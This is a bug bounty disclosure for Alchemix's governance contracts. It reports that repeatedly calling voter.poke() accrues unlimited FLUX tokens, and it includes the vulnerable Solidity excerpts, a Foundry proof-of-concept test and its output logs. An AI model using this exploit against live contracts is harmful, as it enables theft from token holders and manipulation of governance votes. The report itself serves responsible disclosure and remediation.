# 30650 - \[SC - Critical] Infinite minting of FLUX through voterpoke

Submitted on May 3rd 2024 at 01:32:01 UTC by @Django for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30650

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A user can mint infinite FLUX token by simply calling `voter.poke()` as many times as they want. Each time `poke()` is called, it subsequently calls `_vote()` which calls `FLUX.accrueFlux()`, allowing a user to mint at will.

## Vulnerability Details

A user accrues FLUX through voting and resetting their token after each voting epoch. Quite simply, a user can use the `voter.poke()` function as many times as possible to accrue infinite unclaimed FLUX, and then claim the FLUX in the `FluxToken.sol` contract.

```
    function poke(uint256 _tokenId) public {
        /...


        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

```
    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        _reset(_tokenId);


        ...


        IFluxToken(FLUX).accrueFlux(_tokenId);
}
```

```
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

## Impact Details

* Infinite minting of FLUX will steal value from token holders
* Infinite FLUX allows for infinite boosting of voting power and governance manipulation

## Output from POC

The POC simply calls poke 10 times without changing the block number or timestamp.

```
[PASS] testAccrueFluxByPoke() (gas: 1657988)
Logs:
  FLUX Balance 2908413273694656603
  FLUX Balance 3865098966228530943
  FLUX Balance 4821784658762405283
  FLUX Balance 5778470351296279623
  FLUX Balance 6735156043830153963
  FLUX Balance 7691841736364028303
  FLUX Balance 8648527428897902643
  FLUX Balance 9605213121431776983
  FLUX Balance 10561898813965651323
  FLUX Balance 11518584506499525663
```

## Proof of Concept

```
    function testAccrueFluxByPoke() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        hevm.startPrank(admin);

        uint256 claimedBalance = flux.balanceOf(admin);
        uint256 unclaimedBalance = flux.getUnclaimedFlux(tokenId);

        assertEq(claimedBalance, 0);
        assertEq(unclaimedBalance, 0);

        voter.reset(tokenId);

        unclaimedBalance = flux.getUnclaimedFlux(tokenId);
        uint256 fluxEachEpoch = veALCX.claimableFlux(tokenId);

        // Claimed balance is equal to the amount able to be claimed
        assertEq(unclaimedBalance, veALCX.claimableFlux(tokenId));

        hevm.warp(block.timestamp + nextEpoch);

        voter.reset(tokenId);

        // Add this voting periods claimable flux to the unclaimed balance
        unclaimedBalance += veALCX.claimableFlux(tokenId);

        // The unclaimed balance should equal the total amount of unclaimed flux
        assertEq(unclaimedBalance, flux.getUnclaimedFlux(tokenId));

        // maliciously poke 10 times
        for (uint256 i = 0; i < 10; i++) {
            voter.poke(tokenId);
            flux.claimFlux(tokenId, flux.getUnclaimedFlux(tokenId));
            console.log("FLUX Balance %s", flux.balanceOf(admin));
        }

        hevm.stopPrank();
    }
```
